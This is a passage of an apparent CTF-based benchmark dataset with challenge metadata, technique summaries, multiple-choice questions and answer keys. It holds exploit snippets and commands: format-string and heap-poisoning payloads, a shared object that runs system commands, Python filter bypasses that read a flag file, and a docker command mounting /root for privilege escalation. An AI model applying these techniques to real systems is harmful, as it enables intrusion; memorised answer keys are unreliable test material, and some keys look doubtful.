            "During a CTF challenge, you need to upload a Python script that the server will execute after performing a validation check by displaying its content with `cat`. The challenge hints at utilizing `cat` in a unique way to bypass the script's execution restrictions. Among the options provided, which cat command option should you research further based on the sometimes overlooked features of `cat` that allow for bypassing script validations by altering how unprintable characters are handled?  - A. `cat -n uploaded.py` - B. `cat -v uploaded.py` - C. `cat -e uploaded.py` - D. `cat -t uploaded.py` "
        ],
        "answer": [
            "A",
            "B"
        ]
    },
    {
        "name": "There is a bug",
        "write_up": "dataset/raw/There is a bug.md",
        "type": "The type of challenge in this write-up is reverse.",
        "competition": [
            "Square/2023",
            "https://ctftime.org/event/2111/tasks/"
        ],
        "score": 150,
        "max_score": 500,
        "difficulty": 0.3,
        "knowledge": [
            "When encountering a challenge that involves a bug in app development, particularly in Android applications, it is possible to decompile the app, inspect the code, and manually insert missing functionality. Specifically, if a function call is missing in the code, one can add the necessary smali code to invoke this function properly. This often requires understanding of the parameters the function expects and ensuring they are passed in the correct order.",
            "Beyond manual code manipulation, dynamic instrumentation tools like Frida can be used to directly invoke functions within the app. This approach is beneficial when the objective is to interact with specific functionality without modifying the app's codebase. Execution via Frida demands constructing the required parameters accurately to successfully call the method and obtain desired outcomes. \n\nExample payload for manual insertion (smali code):\n```smali\ninvoke-virtual {p0, v0, v1, p0, v3}, Lcom/example/authenticator/MainActivity;->getFlag(Landroid/widget/TextView;Landroid/widget/EditText;Landroid/content/Context;Landroid/content/SharedPreferences;)Ljava/lang/String;\nmove-result-object v5\n```"
        ],
        "question": [
            "When decompiling an Android app to insert a missing function in smali code, which of the following correctly explains the order of parameters for the `getFlag` method? - A. The method `getFlag` should first take an `EditText` as parameter followed by a `TextView`, a `SharedPreferences` instance, and lastly a `Context`. - B. The correct order of parameters for the `getFlag` method is a `TextView`, an `EditText`, a `Context`, and a `SharedPreferences` instance. - C. `SharedPreferences` and `Context` should be the first two parameters for the `getFlag` method, followed by `EditText` and `TextView`. - D. The method `getFlag` requires no specific order for parameters as long as all are provided.",
            "When aiming to directly invoke a function within an Android app using Frida, which aspect is most crucial for successfully executing the method to obtain the desired outcome? - A. Choosing the correct tool for decompiling the app to understand its structure before using Frida. - B. Ensuring that the Frida script runs on the device before the app starts to prevent timing issues. - C. Constructing the required parameters accurately to match the method's expected signature. - D. Modifying the app's permissions in the manifest file to allow Frida to inject scripts."
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "theyseemerolling",
        "write_up": "dataset/raw/theyseemerolling.md",
        "type": "crypto",
        "competition": [
            "WolvCTF/2023",
            "https://ctftime.org/event/1866/tasks/"
        ],
        "score": 50,
        "max_score": 700,
        "difficulty": 0.07142857142857142,
        "knowledge": [
            "In a challenge involving custom encryption algorithms, particularly where an algorithm uses a predictable pattern in its key (e.g., starting with a known string), one can recover parts of the encryption key by XORing the known plaintext with the corresponding ciphertext segment. This method is especially useful when the encryption mechanism prepends known or predictable data to each block, allowing for parts of the key to be deduced independent of the rest of the ciphertext.  \n   Example scenario: If a custom encryption algorithm prepends a predictable value like 'wctf{' to the encrypted data, and this predictable value can be associated with the beginning of the ciphertext, then XORing 'wctf' with the first bytes of the ciphertext can reveal the lower 4 bytes of the encryption key.  \n   Example payload: If the first block of ciphertext is `98bf...` and known plaintext starts with `wctf`, then XOR('wctf', '98bf...') can help recover the lower parts of the encryption key.",
            "In scenarios where the encryption key is partially known or predictable, tools like CyberChef can be employed to automate the decryption process, using a combination of its built-in operations such as XOR and From Hex. This approach is effective for decrypting partially known key cryptographic challenges, particularly when the structure of the ciphertext or the encryption process contains identifiable patterns that can be exploited.  \n   Example scenario: Given a ciphertext and a knowledge that the encryption used an 8-byte key with the lower 4 bytes being deducible from the ciphertext by XORing with a known plaintext sequence, one can utilize CyberChef to automate decryption by applying XOR with the recovered key parts over the ciphertext.  \n   Example CyberChef recipe: The recipe would typically involve converting the ciphertext from hex, XORing with the known or partially recovered key, and possibly cleaning up the output to reveal the plaintext or flag."
        ],
        "question": [
            "In a custom encryption challenge where a predictable string 'wctf{' is known to be prepended to the ciphertext, and the first block of ciphertext is given as `98bf...`, which of the following methods can be used to recover the lower 4 bytes of the encryption key? - A. Add 'wctf' to the beginning of each ciphertext block and re-encrypt the entire message. - B. XOR 'wctf' with the first 4 bytes of the ciphertext to recover the lower 4 bytes of the encryption key. - C. Shift the bits of 'wctf' and the ciphertext to find matching patterns. - D. Use a hash function on 'wctf' and compare its output to the ciphertext blocks.",
            "When faced with a ciphertext produced by a custom encryption scheme where only the last 4 bytes of the 8-byte key are unknown, which tool and operation would be most effective for attempting to decrypt the ciphertext knowing the structure of the initial portion of the key? - A. CyberChef, using the \"From Base64\" operation followed by \"RSA decryption.\" - B. GnuPG, with manual decryption steps focusing on the known ciphertext structure. - C. OpenSSL, employing brute force on the entire ciphertext. - D. CyberChef, applying \"From Hex\" and \"XOR\" operations with partially known key parts, based on the predictability of the key structure."
        ],
        "answer": [
            "B.",
            "D."
        ]
    },
    {
        "name": "THREE LITTLE KEYS",
        "write_up": "dataset/raw/THREE LITTLE KEYS.md",
        "type": "reverse",
        "competition": [
            "CyberSecurityRumble/2022",
            "https://ctftime.org/event/1665/tasks/"
        ],
        "score": 474,
        "max_score": 960,
        "difficulty": 0.49375,
        "knowledge": [
            "When dealing with randomness in applications, especially for generating keys or seeds, if the seed value is hard-coded or predictable, the output can be replicated. This allows an attacker to generate the same sequence of values that the application generates. Example in Java for a predictable seed: \n```java\nString key = Integer.toString(new Random(3762).nextInt(8000));\n```",
            "For encrypted data that requires a correct key to decrypt, if the application logic or decryption key involves specific patterns or conditions (like specific byte values, string patterns, etc.), writing a brute-force script to generate combinations that meet these patterns and trying each combination can successfully find the correct key. Such a script will iterate through possible values, applying the conditions to generate potential keys, and use them in an attempt to decrypt the data. The procedure involves identifying the pattern or conditions required for the key, generating keys that adhere to this pattern, and attempting decryption with each key until the correct one is found.\nExample condition: Key must match regex `\\d{2}[*!=()%?$#]\\p{Upper}\\d+!` and specific characters must match or fulfill certain conditions.\n```java\npublic static void openLock() {  \n   // Assume str, str2, str3 are parts of the key or relevant data\n   String str = \"7765\"; // Part of key or a hint from analysis\n   String str2 = \"6c6f7665\"; // Another part of key or a hint\n   String string = \"2a\"; // Additional data or part of the composite key\n\n   // Brute-force loop to try different combinations\n   for (int i = 0; i < 10; i++) {  \n       for (int ii = 0; ii < 10; ii++) {  \n           for (String e : \"*!=()%?$#\".split(\"\")) {  \n               for (String f : \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\".split(\"\")) {  \n                   for (int iii = 0; iii < 10; iii++) {  \n                       String str3 = \"\" + i + \"\" + ii + e + f + \"\" + ii + \"\" + iii + \"\" + i+\"!\";  \n                       // Composite key generation and attempt to use it for decryption\n                       // ...\n                   }  \n               }  \n           }  \n       }  \n   }  \n}  \n```"
        ],
        "question": [
            "When analyzing the code snippet provided for key generation in a mobile application, what is the primary security concern? ```java String key = Integer.toString(new Random(3762).nextInt(8000)); ``` - A. The Random class is not thread-safe. - B. Use of a hard-coded seed value leads to predictable outcomes. - C. The generated key exceeds the optimal length for secure keys. - D. Lack of cryptographic strength in the Random class for key generation purposes.",
            "In attempting to decrypt encrypted data within an application, what strategy is illustrated by the following code snippet? ```java public static void openLock() { // Assuming these variables are related to the encryption key String str = \"7765\"; String str2 = \"6c6f7665\"; String string = \"2a\";  // Brute-force approach to find the correct key for (int i = 0; i < 10; i++) { for (int ii = 0; ii < 10; ii++) { for (String e : \"*!=()%?$#\".split(\"\")) { for (String f : \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\".split(\"\")) { for (int iii = 0; iii < 10; iii++) { String str3 = \"\" + i + \"\" + ii + e + f + \"\" + ii + \"\" + iii + \"\" + i+\"!\"; // Logic to generate composite key and attempt decryption // ... } } } } } } ``` - A. Implementing a complex encryption mechanism to secure data. - B. Applying a cryptographic hash function to enhance data security. - C. Employing a brute-force attack to identify the correct decryption key. - D. Using a secure random number generator to produce cryptographic keys."
        ],
        "answer": [
            "B. Use of a hard-coded seed value leads to predictable outcomes.",
            "C. Employing a brute-force attack to identify the correct decryption key."
        ]
    },
    {
        "name": "Thunderbolt",
        "write_up": "dataset/raw/Thunderbolt.md",
        "type": "crypto",
        "competition": [
            "angstrom/2021",
            "https://ctftime.org/event/1265/tasks/"
        ],
        "score": 200,
        "max_score": 300,
        "difficulty": 0.6666666666666666,
        "knowledge": [
            "When interacting with encryption services in CTF challenges, try issuing inputs of varying lengths to detect pattern changes or anomalies in the encrypted output. This approach can reveal hidden data or hints towards the solution, especially when extending the input leads to visible repetitions or appended data that looks like hex-encoded strings.",
            "In scenarios where encrypted data seems to contain parts of a flag or recognizable patterns following long inputs, progressively increasing the input size may fully reveal hidden or truncated data. This strategy is particularly useful when you notice partial, corrupted, or hex-encoded flag patterns in the service's response, suggesting that the correct or complete data might only be disclosed with sufficiently large input sizes."
        ],
        "question": [
            "In a CTF challenge, you are given access to an encryption service that takes arbitrary input and returns an encrypted string. When testing with a single character input, you receive a long encrypted response without apparent patterns. What should your next step be to potentially uncover hidden data or patterns in the service's response? - A. Repeat the single character input with exactly the same length and compare the encrypted responses. - B. Try a totally different single character to see if the encryption algorithm changes. - C. Submit a significantly larger string of a single repeated character and analyze any change in the pattern or length of the encrypted response. - D. Immediately conclude that the service's encryption is too strong to be analyzed and give up. ",
            "During an encryption challenge, after submitting a very long string of the same character, you notice a repeatable pattern toward the end of the encrypted response, including parts of what seems like a hexadecimal-encoded string. Given this observation, what could be an effective method to potentially reveal more about the hidden or truncated data? - A. Continue submitting inputs of the same length since the pattern has already started to emerge. - B. Submit an exponentially larger input to potentially uncover the full extent of the hidden or truncated data. - C. Change the repeated character to a different one to see if the pattern changes its format. - D. Decrypt the hexadecimal code directly without altering the input size, assuming that all necessary data has already been revealed. "
        ],
        "answer": [
            "C.",
            "B."
        ]
    },
    {
        "name": "TI-1337 Plus CE",
        "write_up": "dataset/raw/TI-1337 Plus CE.md",
        "type": "misc",
        "competition": [
            "DiceCTF/2021",
            "https://ctftime.org/event/1236/tasks/"
        ],
        "score": 378,
        "max_score": 500,
        "difficulty": 0.756,
        "knowledge": [
            "For challenges involving restrictions on variable names or global operations in Python, specially crafted payloads that avoid using names beginning with an underscore or global operations directly can circumvent these filters. One technique entails leveraging `IMPORT_FROM` opcode (which behaves similarly to `LOAD_ATTR`) to extract and utilize Python internals or bypass restrictions cleverly by manipulating objects within allowed namespaces.",
            "In scenarios where code execution is filtered or restricted within a Python environment, utilizing C extensions (.so files) or creatively manipulating bytecode in .pyc files provides an alternative avenue for executing arbitrary code. This approach involves generating a shared object file that performs the desired operation (such as reading a flag file) and importing it into the Python script or carefully crafting a .pyc file that bypasses opcode filters to achieve code execution. One inventive usage of this method includes creating a .pyc file with marshalled bytecode that exploits unexpected behavior in Python's unmarshalling process to leak secrets or directly invoke system commands.\n   \n   Example of creating a shared object for arbitrary code execution:\n   ```\n   // pwn.c\n   void PyInit_pwn() {\n     system(\"cat /flag.*.txt\");\n     exit(0);\n   }\n   // Compile with: gcc pwn.c -shared -o pwn.so\n   ```\n\n   For .pyc manipulation, it involves deep understanding of Python internals and crafting .pyc files that adhere to UTF-8 encoding rules but contain bytecode sequences that lead to arbitrary code execution. This process is highly specific and complex, involving meticulous bytecode editing to adhere to Python's execution and encoding constraints, and thus, hard to generalize into a simple example."
        ],
        "question": [
            "When faced with restrictions on using names that start with an underscore in Python, which of the following techniques can be used to bypass such restrictions using the `IMPORT_FROM` opcode? - A. Directly access and modify protected variables starting with an underscore. - B. Utilize the `IMPORT_FROM` opcode to indirectly load and execute attributes from modules without directly calling restricted names. - C. Rename variables at runtime to avoid using an underscore prefix. - D. Use regular expressions to manipulate strings and bypass naming restrictions. ",
            "In a Python environment with strict opcode filtering that prevents execution of potentially unsafe code, which approach could be used to read the contents of a flag file stored with a random name on the filesystem? - A. Direct modification of the Python interpreter to disable opcode filtering. - B. Writing a Python script that uses reflection to bypass opcode filters. - C. Creating and importing a shared object file (.so) to execute system commands and read the flag file. - D. Crafting a standard Python script to directly open and read the flag file despite opcode filtering. "
        ],
        "answer": [
            "B. Utilize the `IMPORT_FROM` opcode to indirectly load and execute attributes from modules without directly calling restricted names.",
            "C. Creating and importing a shared object file (.so) to execute system commands and read the flag file."
        ]
    },
    {
        "name": "TI-1337",
        "write_up": "dataset/raw/TI-1337.md",
        "type": "This is a reverse challenge.",
        "competition": [
            "DiceCTF/2022",
            "https://ctftime.org/event/1541/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "To bypass input filters or character blacklists in CTF challenges involving code execution, utilize alternative Python syntax structures that are not restricted by the filter. For example, class definitions and decorators can execute functions without using forbidden characters like parentheses or specific symbols, which are commonly blocked to prevent direct function calls or attribute access.\n   \n   Example payload part:\n   ```python  \n   @chr\n   @len\n   @str\n   class c{'1'*(x-0x14)}:pass\n   ```",
            "For challenges that require crafting payloads without certain characters (e.g., uppercase letters, special symbols), a creative approach is to encode the payload using allowed characters only, such as lowercase letters or numbers. This can be achieved by generating classes or variables with names of varying lengths to represent different character codes, and then converting these back into the required characters.\n\n   Example payload part for constructing a string to execute arbitrary code:\n   ```python\n   payload = 'print(open(\"flag.txt\").read())'\n   for i in map(ord, set(payload)):\n       print(export(i))\n   \n   print('fff=lambda x:' + '+'.join(encode(payload)))\n   print('@eval')\n   print('@fff')\n   print('class d:pass')\n   ```"
        ],
        "question": [
            "When facing a filter that restricts the use of characters common in function calls, which alternative Python syntax feature can be utilized to achieve function execution without using the restricted characters? - A. Using numeric calculations to manipulate string values indirectly. - B. Directly modifying Python bytecode to inject function calls. - C. Employing class definitions and decorators to execute functions. - D. Encapsulating commands in strings and using the `exec` function on them.",
            "In a scenario where you need to craft a payload without using any uppercase letters, special symbols, or numbers over a certain value to execute arbitrary code, which encoding strategy could be effectively applied? - A. Translating the payload into a binary representation and using logical operations for reassembly. - B. Utilizing class or variable names of varying lengths to represent character codes, subsequently converted back into the required characters. - C. Applying base64 encoding to the payload and then decoding it at runtime using allowed characters to call the decode function. - D. Splitting the payload into smaller chunks, encoding each separately with a different algorithm, and combining them at runtime."
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Tic Tac Toe",
        "write_up": "dataset/raw/Tic Tac Toe.md",
        "type": "reverse",
        "competition": [
            "HexionCTF/2020",
            "https://ctftime.org/event/1014/tasks/"
        ],
        "score": 991,
        "max_score": 998,
        "difficulty": 0.9929859719438878,
        "knowledge": [
            "In challenges involving format string vulnerabilities, using specific format string tokens combined with direct memory address referencing enables the modification of program behavior or variables. For a scenario requiring altering a game's logic to always win (or to change difficulty settings, AI behavior, etc.), one can directly write to a memory address that influences that logic. This can be achieved by constructing a payload that combines a number of printed characters (`%<number>c`) with the directive to write the number of printed characters to a memory address (`%<position>$hn`), followed by the actual target memory address. \nExample payload: `%7561c%10$hn` followed by the memory address, e.g., `p64(0x603010)`",
            "In binary exploitation challenges where PIE (Position Independent Executables) is enabled, which means addresses are randomized, consider scenarios where only partial overwrites of certain memory addresses (such as return addresses) are necessary. This can be particularly powerful if the target function's address only differs by a few bytes from the return address on the stack. Leveraging a buffer overflow vulnerability to perform a partial overwrite of the return address to redirect execution flow to a desirable function within the binary (such as a win function) can be an effective strategy. Ensure that the payload adjusts a counter or buffer length in such a way that the overwrite occurs exactly at the desired offset.\nExample payload: A sequence of 'bad characters' (non-newline) followed by a specific byte (`'\\x12'`) that targets the stack-based counter variable to precisely overwrite a return address' least significant byte, e.g., to call a `win` function."
        ],
        "question": [
            "When exploiting a format string vulnerability to modify a program variable, what directive allows you to write a specified number of characters to a given memory address? - A. `%<position>$s` followed by the address - B. `%<number>d%<position>$n` followed by the address - C. `%<number>c%<position>$hn` followed by the address - D. `%<number>x%<position>$hhn` followed by the address",
            "In a binary exploiting challenge with enabled PIE, aiming for a redirection of execution flow via partial overwrite, which of the following payloads correctly adjusts a buffer length counter for a precise memory address manipulation to redirect execution to a win function? - A. A series of alphanumeric characters followed by `'\\x0f'` - B. A string of 'good characters' except newlines, appended with `'\\x12'` - C. A sequence of 'bad characters' (non-newline), ending with `'\\x12'` - D. A combination of random bytes followed by `'\\xff'` to overwrite a stack pointer"
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "TicTacToe",
        "write_up": "dataset/raw/TicTacToe.md",
        "type": "pwn",
        "competition": [
            "TAMUctf/2021",
            "https://ctftime.org/event/1320/tasks/"
        ],
        "score": -1,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "For challenges leveraging insecure deserialization vulnerabilities, particularly with pickle in Python, an attacker can manipulate serialized data to achieve arbitrary code execution or alter application logic. After obtaining a serialized object, one can modify it to change the application's behavior to their advantage, such as artificially inflating win counters or bypassing security checks.",
            "In scenarios where an application uses a hash to validate data integrity or security (e.g., ensuring that winning counts haven't been tampered with), it's possible to bypass this mechanism if the hash generation relies on predictable or accessible data. By understanding how the hash is generated (e.g., combining a known variable with a secret), an attacker can reconstruct a valid hash for manipulated data, as long as they can control or predict the inputs to the hash function."
        ],
        "question": [
            "When examining a scenario involving insecure deserialization with Python's `pickle` module, which method illustrates a potential security risk by allowing an attacker to alter the serialized data that influences the application's logic? - A. Using `json.loads()` to deserialize data received from an untrusted source. - B. Utilizing `pickle.dumps()` to serialize data before sending it to a client. - C. Employing `pickle.loads()` to deserialize data received from a client without any form of validation or sanitization. - D. Applying `eval()` to execute a string received over the network. ",
            "In the context of bypassing a security mechanism that validates data integrity through a hash, which statement is true regarding the manipulation of this mechanism if the attacker knows the formula used to generate the hash and has control over its inputs? - A. The attacker cannot manipulate the hash if the server-side secret is unknown, making this method secure. - B. Manipulation is not possible because hash functions like SHA-256 are collision-resistant, preventing the creation of a hash for altered data that matches the original. - C. If the hash generation relies on a combination of predictable or controllable variables and a secret, the attacker can reconstruct a valid hash for manipulated data, bypassing the check. - D. Altering data to match a given hash is straightforward by using reverse-engineering techniques on the hash function. "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "tigress",
        "write_up": "dataset/raw/tigress.md",
        "type": "The type of this CTF challenge is reverse.",
        "competition": [
            "UTCTF/2020",
            "https://ctftime.org/event/929/tasks/"
        ],
        "score": 1981,
        "max_score": 1991,
        "difficulty": 0.9949773982923155,
        "knowledge": [
            "In a challenge involving a virtual machine or any form of obfuscated code execution, hardware breakpoints (hw bp) can be used effectively to trace how user input or other specific data is accessed and manipulated throughout the execution. This is especially useful when dealing with encrypted or obfuscated inputs where the obfuscation or encryption process needs to be understood. Setting breakpoints on specific handlers such as \"get_byte\" or \"xor\" can reveal the operations performed on the input data.",
            "When faced with an obfuscated code challenge that involves bitwise operations such as XOR on the user input, a possible approach to deduce the original input or key values is to use constraint solvers like Z3. By modeling the known operations and their results as constraints (e.g., input XOR key = result), the solver can be used to find possible values of the original input or keys that satisfy all given constraints. This method is particularly useful when the direct analysis of the obfuscation logic is too complex or not feasible.\n\nExample of modeling constraints with Z3:\n```python\nfrom z3 import BitVec, Solver, Or\n\nflag_len = len(magics)  # Assuming magics contain (XOR operand, result) tuples\ns = Solver()\n\nfor i in range(flag_len):\n    input_byte = BitVec(f'b{i}', 8)  # Symbolic variable for input byte\n    xor_operand, xor_result = magics[i]\n    # Adding constraints: input byte should be printable and satisfy the XOR operation\n    s.add(input_byte >= 32, input_byte <= 127, input_byte ^ xor_operand == xor_result)\n```"
        ],
        "question": [
            "In the provided scenario, a participant is tackling an obfuscated code challenge. One of their strategies involves setting a hardware breakpoint on memory locations where user input is stored or manipulated. In the context of debugging obfuscated or packed binaries, why is setting hardware breakpoints on instructions that access or modify specific data (like user input) crucial?  - A. It enables the debugger to automatically modify the code at runtime. - B. It allows the debugger to skip irrelevant parts of the program execution. - C. It helps in tracking how the user input is processed or transformed across different parts of the binary, crucial for understanding obfuscation or encryption mechanisms. - D. It provides a mechanism to increase the speed of the program execution. ",
            "In handling an obfuscated code challenge where the user input undergoes XOR operations with unknown keys, the participant decides to employ Z3, a constraint solver, to reverse-engineer the keys. Given the observed pattern that each input character is XOR'd with a unique key, resulting in a known output, which of the following best describes the rationale behind using a constraint solver like Z3 for this scenario?  - A. Constraint solvers can generate new obfuscation algorithms, making the reverse engineering process more straightforward. - B. Constraint solvers like Z3 can automate the guessing of input characters, bypassing the need to understand the XOR operation. - C. Z3 can optimize the compilation process, ensuring that the XOR operations are executed more efficiently. - D. Using constraint solvers allows for defining conditions (constraints) for input characters and their XOR operations, enabling the automated finding of key values that satisfy these constraints. "
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "Tik tok",
        "write_up": "dataset/raw/Tik tok.md",
        "type": "pwn",
        "competition": [
            "DawgCTF/2020",
            "https://ctftime.org/event/1030/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When exploiting heap-based vulnerabilities, if a program allows for manipulation of file descriptors (FD) by overflowing non-null terminated arrays or strings, one can potentially force a file descriptor to be 0 (standard input, stdin). This method can enable reading from stdin in functions meant to read from files, allowing controlled input to overflow and manipulate heap structures. A technique to achieve this involves sending a payload to fill a buffer and include the file descriptor within the non-null terminated path, exploiting the program's behavior to overwrite the delimiter with a null byte, effectively turning a part of the buffer into a file descriptor.\n\n    - Sample payload construction method:\n    ```python\n    def add_song(path):\n        send(\"1\")  # Option to add a song\n        send(path)  # Send the path that overflows and manipulates the file descriptor\n\n    for i in range(initial_fd, target_fd_character_ascii):\n        add_song(\"valid/song/path.txt\")\n    add_song(\"OverflowingPath\" + \"/\" * (buffer_size - len(\"OverflowingPath\")))\n    ```",
            "Utilizing tcache poisoning for arbitrary memory write in a heap exploitation scenario requires manipulating the tcache (thread's cache) linked list to point to a desired memory address. This can be done by overflowing the heap to overwrite a freed chunk\u2019s FD (forward pointer) in the tcache with an arbitrary address. Subsequently, allocating a new chunk of the appropriate size will return a pointer to the arbitrary address, achieving controlled writing. It is essential to first understand the binary's heap management to set up the heap layout adequately and perform necessary allocations and deallocations to position the chunks for overflow and poisoning.\n\n    - Example approach to overwrite `__free_hook`:\n    ```python\n    def play_and_free_song(index, data):\n        play_song(index)  # Trigger overflow\n        send(data)  # Send payload that overflows into tcache FD\n        free_song(index)  # Free the song to add it to tcache\n\n    play_and_free_song(target_song_index, payload_to_overflow_tcache_fd_with_target_address)\n    allocate_song(size, \"data\")  # Allocate to consume the poisoned tcache chunk, effectively writing to the arbitrary address\n    ```"
        ],
        "question": [
            "When attempting to exploit a heap-based vulnerability by manipulating file descriptors to read from standard input, which of the following strategies outlines the correctly described exploitation technique?  - A. Send a payload that exactly matches the buffer size to ensure the file descriptor remains unaffected. - B. Use a series of null bytes \"\\x00\" to fill the buffer and manipulate the file descriptor value directly. - C. Overflow the path buffer without a null terminator, so part of it is treated as a file descriptor which is then overwritten by strtok to read from stdin. - D. Increase the size of the buffer dynamically to force an overflow, changing the file descriptor to point to a controlled buffer. ",
            "In a scenario where tcache poisoning is used to achieve arbitrary memory write in heap exploitation, which of the following best describes the correct method for manipulating the tcache linked list to achieve this goal?  - A. Directly edit the tcache's head pointer in memory to point to an arbitrary address without manipulating any heap metadata. - B. Perform a double-free vulnerability on a chunk and then overflow the adjacent chunk's metadata to rewrite the FD pointer of the freed chunk to point to an arbitrary address. - C. Overflow a heap chunk's contents to arbitrarily increase the size of the next chunk, tricking malloc into returning a pointer to a controlled location. - D. Overflow a heap chunk to overwrite the FD (forward pointer) of a freed chunk in tcache with an arbitrary address, then allocate a new chunk to write to that address. "
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "Time Eater",
        "write_up": "dataset/raw/Time Eater.md",
        "type": "web",
        "competition": [
            "DarkCTF/2020",
            "https://ctftime.org/event/1118/tasks/"
        ],
        "score": 482,
        "max_score": 499,
        "difficulty": 0.9659318637274549,
        "knowledge": [
            "When faced with a scenario requiring directory and file enumeration on a web server where the usual points of interest provide little to no information, employing tools like Gobuster with a comprehensive wordlist can unveil hidden directories or files that may contain valuable information for progressing in a challenge. Such enumeration can disclose endpoints that are not directly linked or visible from the main application's interface. For example:\n   - **Gobuster command sample**: `gobuster dir -t 50 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://${IP} --timeout 30s`",
            "In challenges involving gaining higher privileges or accessing restricted files, if docker is present and the user has permissions to interact with docker, creating and running a docker container can be utilized to mount the host system's sensitive directories (like `/root`) inside the container. This approach can enable access to files that would otherwise be inaccessible due to permission restrictions. This technique is highly effective in environments where docker containers are configured to run as root or with elevated privileges.\n   - **Docker command sample for privilege escalation**: `docker run -v /root:/loot --rm -it alpine /bin/sh`, followed by navigating to the mounted directory to access restricted files."
        ],
        "question": [
            "When conducting directory and file enumeration against a web server and traditional reconnaissance methods fall short, which command is effective in discovering hidden directories that might contain useful leads or secrets for penetration testing?  - A. `sudo netstat -tulnp` - B. `gobuster dir -t 50 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://${IP} --timeout 30s` - C. `nmap -Pn -p- http://${IP}` - D. `curl -X GET http://${IP}/hidden-directory` ",
            "Given an environment where the user has permissions to interact with docker and needs to escalate privileges or access restricted files, which of the following docker commands is correctly used to mount the host's sensitive directory inside a container, thereby enabling access to restricted files?  - A. `docker exec -it container_name /bin/bash` - B. `docker pull alpine:latest && docker run alpine` - C. `docker ps -a` - D. `docker run -v /root:/loot --rm -it alpine /bin/sh` "
        ],
        "answer": [
            "B",
            "D"
        ]
    },
    {
        "name": "Tiny EasterEgg",
        "write_up": "dataset/raw/Tiny EasterEgg.md",
        "type": "misc",
        "competition": [
            "OverTheWireAdventBonanza/2018",
            "https://ctftime.org/event/721/tasks/"
        ],
        "score": 50,
        "max_score": 400,
        "difficulty": 0.125,
        "knowledge": [
            "When dealing with DNA or genetic sequence data within a CTF challenge, a custom script can be utilized to decode the sequence into readable information, such as a flag. Firstly, the script can map each group of DNA bases (ATGC) to hexadecimal characters to represent bytes of data. A DNA sequence without common characters in groups of four (e.g., ATGC) can signify a unique mapping to hexadecimal values, which are then converted into ASCII characters revealing the flag or secret message. This approach requires iterating through the DNA sequence, converting each quartet of bases into its respective byte, and ultimately translating the byte array into a string or file for analysis.",
            "In scenarios that involve complex data encoding as seen with genetic sequences, it's essential to carefully select and iterate through all possible patterns or permutations that meet a specific criteria\u2014such as each character in the pattern being unique. Utilizing nested loops in a script allows for the generation of these patterns systematically. Each generated pattern can then be tested against the dataset, in this case, the DNA sequence, to attempt decoding based on predefined rules (mapping bases to bits, then to bytes, and finally to ASCII characters). Creating a broad search strategy across different patterns enhances the chance of successfully decoding the concealed information.\n   \n   Sample decoding approach (simplified for practical application):\n   \n   ```python\n   def decode_dna_to_bytes(dna_sequence):\n       mapping = {'A': 0, 'T': 1, 'G': 2, 'C': 3} # Example base to binary mapping\n       bytes_array = []\n       for i in range(0, len(dna_sequence), 4): # Process each quartet\n           quartet = dna_sequence[i:i+4]\n           byte = 0\n           for j in range(4):\n               byte |= mapping[quartet[j]] << (6 - 2*j)\n           bytes_array.append(byte)\n       return bytes(bytes_array)\n   ```"
        ],
        "question": [
            "In a cybersecurity CTF challenge focusing on genetic data encoding, a script is needed to decode a sequence of DNA bases (e.g., ATGC) into meaningful information such as a flag. Given the complexity of DNA sequences and the need for precise mapping, what would be an efficient approach to convert each quartet of distinct bases into bytes of data before translating them into ASCII characters to reveal hidden messages? - A. Use a dictionary to map individual bases to their numerical equivalents, then iterate through the DNA sequence quartet by quartet, converting each base into a 2-bit binary representation to form a byte. - B. Directly match each quartet of bases with an ASCII character without conversion to binary or byte form, relying solely on pattern recognition. - C. Assign each DNA base a random number between 1 and 4, add the values of each quartet, and use the sum to look up ASCII characters in a pre-defined list. - D. Translate each base into a fixed ASCII character, then look for patterns in the resulting text that might resemble the flag format typically used in CTFs (e.g., AOTW{...}). ",
            "In a script designed to identify and decode encrypted messages hidden within DNA sequences for a cybersecurity challenge, generating a list of unique quartet patterns plays a crucial role. Considering the specificity required for each character in a pattern to be distinct, which of the following coding approaches ensures the systematic generation of all possible unique quartet patterns from a given set of characters ('A', 'T', 'G', 'C'), excluding any repeating characters within a quartet? -  A. Use four nested loops, each iterating over the set of characters. Within the innermost loop, concatenate characters only if all are distinct, resulting in patterns where no character repeats. - B. Create a single loop that randomly shuffles the set of characters and picks the first four characters as a quartet pattern, repeating the process without checking for uniqueness. - C. Utilize a recursive function that generates quartets without ensuring the uniqueness of characters, leading to potential repetitions within each pattern. - D. Implement a function that directly assigns each character to a numerical value and uses those to generate patterns, ignoring the requirement for each character in the quartet to be unique. "
        ],
        "answer": [
            "A",
            "A"
        ]
    },
    {
        "name": "Tiny ECC",
        "write_up": "dataset/raw/Tiny ECC.md",
        "type": "crypto",
        "competition": [
            "Crypto/2021",
            "https://ctftime.org/event/1258/tasks/"
        ],
        "score": 217,
        "max_score": 477,
        "difficulty": 0.4549266247379455,
        "knowledge": [
            "When selecting a prime number for elliptic curve cryptography, ensure that the chosen prime number `p` satisfies specific properties: it must be prime, have a bit length equal to a predetermined value (for example, 128 bits), and `2*p + 1` must also be prime. These conditions are crucial for setting up the elliptic curve parameters correctly, especially when the curve is used in cryptographic challenges or systems.",
            "In elliptic curve challenges, particularly when solving the discrete logarithm problem, it's possible to simplify the challenge by forging the elliptic curve to a more manageable form. Specifically, altering the curve to `y^2 = x^3` simplifies solving the discrete logarithm problem. This can be accomplished by setting the curve's parameters `(a, b)` to `(0,0)` modulo `p`. However, if direct zero values are not permitted, one can use equivalent values that are congruent to `0` modulo `p`, such as `(a, b) = (p*(2*p+1), p*(2*p+1))` for the given prime `p`. This strategy leads to the creation of a singular curve, for which the discrete logarithm problem simplifies to a division operation in the corresponding modular field."
        ],
